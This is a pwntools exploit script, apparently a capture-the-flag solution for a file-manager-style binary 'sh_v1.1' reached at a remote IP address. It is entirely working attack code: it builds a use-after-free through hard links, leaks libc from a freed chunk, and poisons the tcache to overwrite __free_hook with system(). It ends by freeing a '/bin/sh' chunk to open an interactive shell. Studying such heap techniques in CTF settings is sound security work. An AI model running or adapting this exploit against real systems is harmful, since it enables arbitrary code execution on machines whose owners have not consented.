from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./sh_v1.1'])
sh = remote("121.40.89.206", 34883)
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')

for i in range(9):
    sh.sendlineafter(b'>>>>', f'touch {i}'.encode())
    sh.sendline(chr(i+ord('a'))*0x20)

sh.sendlineafter(b'>>>>', f'ln 1 9'.encode())  # 9 <--> 0
sh.sendlineafter(b'>>>>', f'ln 2 10'.encode())  # 10 <--> 1

for i in range(8,-1,-1):
    sh.sendlineafter(b'>>>>', f'rm {i}'.encode())


sh.sendlineafter(b'>>>>', f'cat 9'.encode())

libc_base = u64(sh.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 96 - 0x10 - 0x1ebb70
__free_hook = libc_base + 0x01eeb28
system_addr = libc_base + 	0x055410
print("libc_base >>", hex(libc_base))

sh.sendlineafter(b'>>>>', f'gedit 10'.encode())
# gdb.attach(sh)
# pause(4)
sh.sendline(p64(__free_hook) + p64(0))

sh.sendlineafter(b'>>>>', f'touch 11'.encode())
sh.sendline(b'/bin/sh')

sh.sendlineafter(b'>>>>', f'touch 12'.encode())
sh.sendline(p64(system_addr))

sh.sendlineafter(b'>>>>', f'rm 11'.encode())
sh.interactive()